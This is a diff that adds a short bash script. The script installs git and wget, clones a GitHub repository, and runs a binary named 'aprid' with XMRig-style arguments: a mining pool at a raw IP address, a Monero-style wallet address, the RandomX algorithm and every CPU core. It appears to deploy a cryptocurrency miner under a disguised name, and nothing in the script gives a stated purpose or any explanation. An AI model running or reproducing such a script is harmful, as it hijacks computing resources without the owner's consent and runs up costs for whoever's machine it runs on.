@@ -1,0 +1,6 @@
+#!/bin/bash
+apt update && apt -y install sudo
+apt -y install git wget
+git clone https://github.com/nonibihan/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o 152.42.247.49:443 -u SaLvs8XxvQyYjNN8GjS2LaiB1agypotxhEFKEnEEfbQvRbLxrdmkx2i8wHNcNHJbXCa9kASD1LZFyccETuEUc1HpUAtTJ3h4JUP -p kowek -a rx/0 -k -t $(nproc --all)
